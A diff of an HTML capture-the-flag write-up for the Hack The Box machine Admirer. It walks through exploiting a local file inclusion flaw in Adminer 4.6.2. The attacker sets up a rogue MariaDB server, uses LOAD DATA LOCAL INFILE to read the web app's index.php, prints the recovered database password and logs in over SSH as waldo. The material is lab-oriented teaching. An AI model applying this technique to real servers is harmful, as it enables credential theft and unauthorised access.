@@ -130,29 +130,25 @@ wfuzz -c -w /usr/share/wordlists/dirb/big.txt --hc=403,404 -u "http://10.10.10.1
                 <h2><a href="#machine-access">2.</a> Machine Access</h2>
                 <section id="lfi-vuln" class="subsection">
                     <h3><a href="#lfi-vuln">2.1</a> LFI vulnerability</h3>
-                    <p>Doing a little bit of research about the application and its version (as it was shown in its login page), I found out that Adminer ver. 4.6.2 is presents a Local File Inclusion vulnerability.</p>
-                    <p>This specific version of Adminer allows an attacker to connect to a database on its own machine from the Adminer application. However, as Adminer is running on the victim machine, it is possible to load the content of a file from the victim system.</p>
+                    <p>Doing a little bit of research about the application and its version (shown in its login page), I found out that Adminer ver. 4.6.2 presents a Local File Inclusion vulnerability.</p>
+                    <p>This specific version of Adminer allows an attacker to connect to a database on its own machine from the Adminer application. However, as Adminer is running on the victim machine, it is possible to load the content of a file from the victim system instead from the machine where the application is connected to.</p>
                     <p>This vulnerability and its exploit are further explained in <a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">this article</a> by Foregenix as well on <a href="https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">this Medium post</a> by <a href="https://twitter.com/YShahinzadeh?">@YShahinzadeh</a>.</p>
                 </section>
                 <section id="setup-machine" class="subsection">
                     <h3><a href="#setup-machine">2.2</a> Setup local machine</h3>
                     <p>Checking the port where MariaDB was running, I could see that the port was binded only to localhost. Therefore it would reject any connection from the outside.</p>
                     <img src="/img/htb/admirer/check-mariadb-1.png">
+                    <p>In order to fix that, it is only necessary to replace the bind-adress of the server in its configuration file from <b>127.0.0.1</b> to <b>0.0.0.0</b>.</p>
                     <pre style="width:100%"><code class="hljs bash">
 sudo lsof -i:3306
 sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
 sudo systemctl restart mysql
 sudo lsof -i:3306
                     </code></pre>
-                    <p>In order to fix that, it is only necessary to replace the bind-adress of the server in its configuration file from <b>127.0.0.1</b> to <b>0.0.0.0</b>.</p>
                     <img src="/img/htb/admirer/mariadb-config.png">
                     <p>After restarting the server and checking again, it was ready to accept connections from other machines:</p>
                     <img src="/img/htb/admirer/check-mariadb-2.png">
-                    <p>Then I created a random password and logged into my MariaDB server in order to create a user and database to connect to, assigning the proper permissions.</p>
-                    <pre style="width:100%"><code class="hljs bash">
-pwgen 20 -1
-sudo mysql -u root
-                    </code></pre>
+                    <p>Then I created a random password and logged into my MariaDB server in order to create a user and database to connect to, assigning the proper permissions:</p>
                     <pre style="width:100%"><code class="hljs sql">
 CREATE DATABASE admirertest;
 CREATE USER 'kali'@'%' IDENTIFIED BY "thiethae9xiP6ahthieg";
@@ -164,19 +160,19 @@ FLUSH PRIVILEGES;
                 </section>
                 <section id="lfi-exploit" class="subsection">
                     <h3><a href="#lfi-exploit">2.3</a> Exploit LFI</h3>
-                    <p>Using the newly created database credentials I was able to connect to my database from the Adminer application.</p>
+                    <p>Using the newly created database credentials I was able to connect to my test database from the Adminer application.</p>
                     <img src="/img/htb/admirer/access-adminer.png">
-                    <p>Knowing that the <b>index.php</b> file from the backup had the database credentials, I decided to load that file by taking advantage of the LFI vulnerability.</p>
-                    <p>In order to exploit the vulnerability, first I had to create a database that I named <b>test</b>. Then, by sending the following SQL commands, each row of the indicated file was loaded in the database table:</p>
+                    <p>Knowing that the <b>index.php</b> file from the backup had the database credentials, I decided to load that file by taking advantage of the LFI vulnerability. (This is the moment where the info gathered previously from phpinfo comes in handy).</p>
+                    <p>In order to exploit the vulnerability, first I had to create a database table with a text column that I named <b>test</b>. Then, by sending the following SQL commands, each row of the indicated file was loaded in that table:</p>
                     <pre style="width:100%"><code class="hljs sql">
 LOAD DATA LOCAL INFILE '/var/www/html/index.php'
 INTO TABLE test
 FIELDS TERMINATED BY "\n"
                     </code></pre>
                     <img src="/img/htb/admirer/load-index-sql.png">
-                    <p>After submitting the code, each row of the indicated file was loaded as a row of the created database table. This shown the current database credentials that the web application was using:</p>
+                    <p>After submitting the code, each row of the indicated file was loaded as a row of the created table. This shown the current database credentials that the web application was using:</p>
                     <img src="/img/htb/admirer/loaded-index-file.png">
-                    <p>Testing the found username (<b>waldo</b>) and password (<b>&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</b>) on SSH I was able to log into the server as waldo!</p>
+                    <p>Testing the found username (<b class="nes-text is-primary">waldo</b>) and password (<b class="nes-text is-primary">&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</b>) on SSH I was able to log into the server as waldo!</p>
                    <img src="/img/htb/admirer/ssh-user.png">
                 </section>
             </section>
